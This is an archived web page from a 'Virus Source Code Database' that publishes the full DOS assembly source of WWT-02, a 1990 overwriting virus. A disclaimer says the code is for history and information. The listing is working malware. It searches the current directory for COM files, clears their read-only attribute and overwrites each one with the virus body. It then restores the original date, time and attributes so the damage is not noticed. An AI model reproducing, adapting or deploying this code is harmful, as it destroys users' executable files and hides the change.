<html>
<head><meta http-equiv=Content-Type content='text/html; charset=UTF-8'>

<title>Virus Source Code Database :: wwt_02_asm</title>
<meta name="KEYWORDS" content="wwt_02.asm, virus source, source code, assembly language, assembly programming, hacking, cracking, michaelangelo, stoned, pong, cascade, ambulance, f-prot, mcafee, panda, solomon, anti-virus, anti virus, computer virus">
<meta name="DESCRIPTION" content="Virus Source Code Database - source for wwt_02.asm">
</head><body><table border=0 cellpadding=0 cellspacing=0 width="100%">
<tr><td valign=top width="25%">
<a href="w13_507_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/w/w13_507_asm.php">w13_507_asm</a><br>
<a href="w13_534__asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/w/w13_534__asm.php">w13_534__asm</a><br>
<a href="w13_534_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/w/w13_534_asm.php">w13_534_asm</a><br>
<a href="w13_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/w/w13_asm.php">w13_asm</a><br>
<a href="walkabr_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/w/walkabr_asm.php">walkabr_asm</a><br>
<a href="wanderer_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/w/wanderer_asm.php">wanderer_asm</a><br>
<a href="warzd00d_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/w/warzd00d_asm.php">warzd00d_asm</a><br>
<a href="whale1_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/w/whale1_asm.php">whale1_asm</a><br>
<a href="whale2_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/w/whale2_asm.php">whale2_asm</a><br>
<a href="whale_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/w/whale_asm.php">whale_asm</a><br>
<a href="wharps_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/w/wharps_asm.php">wharps_asm</a><br>
<a href="whocares_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/w/whocares_asm.php">whocares_asm</a><br>
<a href="why_win_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/w/why_win_asm.php">why_win_asm</a><br>
<a href="why-win_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/w/why-win_asm.php">why-win_asm</a><br>
<a href="wildthg2_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/w/wildthg2_asm.php">wildthg2_asm</a><br>
<a href="wildthng_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/w/wildthng_asm.php">wildthng_asm</a><br>
<a href="wonder_c.php.htm" tppabs="http://www.totallygeek.com/vscdb/w/wonder_c.php">wonder_c</a><br>
<a href="wvir14a_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/w/wvir14a_asm.php">wvir14a_asm</a><br>
<a href="wvir14_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/w/wvir14_asm.php">wvir14_asm</a><br>
<a href="ww_217_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/w/ww_217_asm.php">ww_217_asm</a><br>
<a href="ww-217_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/w/ww-217_asm.php">ww-217_asm</a><br>
<a href="ww217_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/w/ww217_asm.php">ww217_asm</a><br>
<a href="wwt_01_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/w/wwt_01_asm.php">wwt_01_asm</a><br>
<a href="wwt_02_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/w/wwt_02_asm.php">wwt_02_asm</a><br>
</td>
<td valign=top><center><h2>Virus Source Code Database</h2>
<script type="text/javascript">
<!--
                  google_ad_client = "pub-4280558320877613";
                  google_ad_width = 468;
                  google_ad_height = 60;
                  google_ad_format = "468x60_as";
                  google_ad_channel = "5524853059";
                  google_ad_type = "text";
                  google_color_border = "A2CCEE";
                  google_color_bg = "EFEFEF";
                  google_color_link = "000000";
                  google_color_url = "006600";
                  google_color_text = "000000";
        //--></script>
<script type="text/javascript" src="show_ads.js" tppabs="http://pagead2.googlesyndication.com/pagead/show_ads.js"></script>
<p>
<i>This source code is provided for computer programming history.  This source code can be used for good or evil.  It can 
destroy computer data.  Be aware that I am making no claims to authorship or usability of the information found in the 
Virus Source Code Database.  I accept no responsibility for data corruption due to the use of the following information.  The 
information contained on this website is for <b>Information Purposes Only</b>!!!</i><p>
<p>
[ <a href="index.php.htm" tppabs="http://www.totallygeek.com/vscdb/1/index.php">1</a> ]&nbsp;
[ <a href="index-1.php.htm" tppabs="http://www.totallygeek.com/vscdb/a/index.php">a</a> ]&nbsp;
[ <a href="index-2.php.htm" tppabs="http://www.totallygeek.com/vscdb/b/index.php">b</a> ]&nbsp;
[ <a href="index-3.php.htm" tppabs="http://www.totallygeek.com/vscdb/c/index.php">c</a> ]&nbsp;
[ <a href="index-4.php.htm" tppabs="http://www.totallygeek.com/vscdb/d/index.php">d</a> ]&nbsp;
[ <a href="index-5.php.htm" tppabs="http://www.totallygeek.com/vscdb/e/index.php">e</a> ]&nbsp;
[ <a href="index-6.php.htm" tppabs="http://www.totallygeek.com/vscdb/f/index.php">f</a> ]&nbsp;
[ <a href="index-7.php.htm" tppabs="http://www.totallygeek.com/vscdb/g/index.php">g</a> ]&nbsp;
[ <a href="index-8.php.htm" tppabs="http://www.totallygeek.com/vscdb/h/index.php">h</a> ]&nbsp;
[ <a href="index-9.php.htm" tppabs="http://www.totallygeek.com/vscdb/i/index.php">i</a> ]&nbsp;
[ <a href="index-10.php.htm" tppabs="http://www.totallygeek.com/vscdb/j/index.php">j</a> ]&nbsp;
[ <a href="index-11.php.htm" tppabs="http://www.totallygeek.com/vscdb/k/index.php">k</a> ]&nbsp;
[ <a href="index-12.php.htm" tppabs="http://www.totallygeek.com/vscdb/l/index.php">l</a> ]&nbsp;
[ <a href="index-13.php.htm" tppabs="http://www.totallygeek.com/vscdb/m/index.php">m</a> ]&nbsp;
[ <a href="index-14.php.htm" tppabs="http://www.totallygeek.com/vscdb/n/index.php">n</a> ]&nbsp;
[ <a href="index-15.php.htm" tppabs="http://www.totallygeek.com/vscdb/o/index.php">o</a> ]&nbsp;
[ <a href="index-16.php.htm" tppabs="http://www.totallygeek.com/vscdb/p/index.php">p</a> ]&nbsp;
[ <a href="index-17.php.htm" tppabs="http://www.totallygeek.com/vscdb/q/index.php">q</a> ]&nbsp;
[ <a href="index-18.php.htm" tppabs="http://www.totallygeek.com/vscdb/r/index.php">r</a> ]&nbsp;
[ <a href="index-19.php.htm" tppabs="http://www.totallygeek.com/vscdb/s/index.php">s</a> ]&nbsp;
[ <a href="index-20.php.htm" tppabs="http://www.totallygeek.com/vscdb/t/index.php">t</a> ]&nbsp;
[ <a href="index-21.php.htm" tppabs="http://www.totallygeek.com/vscdb/u/index.php">u</a> ]&nbsp;
[ <a href="index-22.php.htm" tppabs="http://www.totallygeek.com/vscdb/v/index.php">v</a> ]&nbsp;
[ <a href="index-23.php.htm" tppabs="http://www.totallygeek.com/vscdb/w/index.php">w</a> ]&nbsp;
[ <a href="index-24.php.htm" tppabs="http://www.totallygeek.com/vscdb/x/index.php">x</a> ]&nbsp;
[ <a href="index-25.php.htm" tppabs="http://www.totallygeek.com/vscdb/y/index.php">y</a> ]&nbsp;
[ <a href="index-26.php.htm" tppabs="http://www.totallygeek.com/vscdb/z/index.php">z</a> ]&nbsp;
</center><p><textarea cols=90 rows=30>

; Virus name		WWT-02
; Description		Attack any COM file in current directory
; Comment		Don't change Date/Time, ignore ReadOnly
; Date			19 Dec 1990    15:30
; Place 		CICTT
;
		mov	dx,offset FileMask	; FileMask for any COM file
		mov	ah,4eh			; Find first file
		mov	cx,1			; including attrib Archive
		int	21h			; Call DOS
		jnc	Ok			; If no error -> go on
		jmp	short Exit		; If error -> exit program

Ok
		call	Infect			; Do infection

DoNext
		mov	dx,80h			; Set DS:DX to DTA
		mov	ah,4fh			; Find Next file
		int	21h			; Call DOS
		jnc	NextOk			; If no error -> go on
		jmp	short Exit		; If error -> exit
NextOk
		jmp	short Ok		; Still next file exist

Exit
		int	20h			; Exit to DOS

Infect
		mov	dx,9eh			; Set DS:DX to filename in DTA
		mov	ax,4300h		; Get file attribute
		int	21h			; Call DOS
		mov	Attrib,cx		; Save attribute for later
		xor	cx,cx			; New attribute -> normal file
		mov	ax,4301h		; Set attribute
		int	21h			; Call DOS
		mov	ax,3d02h		; Open file for Read/Write
		int	21h			; Call DOS
		jc	Exit			; If error -> exit
		mov	bx,ax			; Save handle
		mov	ax,5700h		; Get file Date/Time
		int	21h			; Call DOS
		mov	Date,dx 		; Save date
		mov	Time,cx 		; Save time
		mov	dx,100h 		; DS:DX point to itself
		mov	ah,40h			; Write to handle
		mov	cx,offset VirusSize-100h	; Write only virus
		int	21h			; Call DOS
		mov	ax,5701h		; Restore Date/Time
		mov	cx,Time 		; Old time
		mov	dx,Date 		; Old time
		int	21h			; Call DOS
		mov	ah,3eh			; Close file
		int	21h			; Call DOS
		mov	dx,9eh			; Set DS:DX to filename in DTA
		mov	cx,Attrib		; Restore attribute
		mov	ax,4301h		; Set file attribute
		int	21h			; Call DOS
		ret				; Return to caller


FileMask
		db	'*.COM',0               ; File mask for any COM file
Date
		dw	?
Time
		dw	?
Attrib
		dw	?
VirusSize
		db	?			; Used to calculate virus
						; size

</textarea></td></tr></table></body></html>
